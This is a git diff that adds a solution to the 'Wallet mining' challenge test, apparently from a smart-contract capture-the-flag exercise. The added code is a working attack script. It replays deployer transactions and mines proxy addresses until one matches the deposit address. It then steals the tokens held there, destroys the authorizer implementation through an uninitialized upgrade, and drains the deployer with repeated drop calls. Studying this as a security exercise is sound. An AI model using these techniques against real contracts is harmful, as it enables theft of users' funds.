@@ -1,5 +1,8 @@
 const { ethers, upgrades } = require('hardhat');
 const { expect } = require('chai');
+const { FACTORY_TX, MASTERCOPY_TX, SET_IMPL_TX } = require('./tx_data');
+const { getImplementationAddress } = require('@openzeppelin/upgrades-core');
+
 
 describe('[Challenge] Wallet mining', function () {
     let deployer, player;
@@ -66,6 +69,59 @@ describe('[Challenge] Wallet mining', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // send some ether to the Safe: Deployer 3
+        let safe_deployer = '0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A';
+        await player.sendTransaction(
+            {to: safe_deployer, value: ethers.utils.parseEther("1")}
+        );
+
+        // Emulate first 3 transactions from Safe: Deployer 3
+        await (await ethers.provider.sendTransaction(
+            MASTERCOPY_TX
+        )).wait();
+
+        await (await ethers.provider.sendTransaction(
+            SET_IMPL_TX
+        )).wait();
+
+        await (await ethers.provider.sendTransaction(
+            FACTORY_TX
+        )).wait();
+
+        const factory = await (await ethers.getContractFactory("GnosisSafeProxyFactory", deployer))
+            .attach(await walletDeployer.fact());
+        const mastercopy = await (await ethers.getContractFactory("GnosisSafe", deployer))
+            .attach(await walletDeployer.copy());
+        
+        // Create Gonsis Proxies until get 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
+        let attacker_proxy;
+        let attacker = await (await ethers.getContractFactory("AttackerWalletMining", deployer))
+            .deploy(authorizer.address, walletDeployer.address, token.address);
+        for (let i = 0; i < 99; i++) {
+            attacker_proxy = await factory.createProxy(attacker.address, "0x");
+            attacker_proxy = ethers.utils.defaultAbiCoder.decode([ "address" ], (await attacker_proxy.wait()).logs[0].data)[0].toLowerCase();
+            if (attacker_proxy == DEPOSIT_ADDRESS) {
+                break;
+            }
+        }
+
+        // Steal funds
+        attacker_proxy = await (await ethers.getContractFactory("AttackerWalletMining", deployer))
+            .attach(attacker_proxy);
+        await attacker_proxy.connect(player).steal(token.address);
+
+
+        // call init, upgradeTo and selfdestruct
+        const impl_address = await getImplementationAddress(ethers.provider, authorizer.address);
+        await attacker.connect(player).attack(impl_address);
+
+        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
+        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
+
+        for (var i = 0; i < 43; i++) {
+            await walletDeployer.connect(player).drop("0x");
+        }
     });
 
     after(async function () {
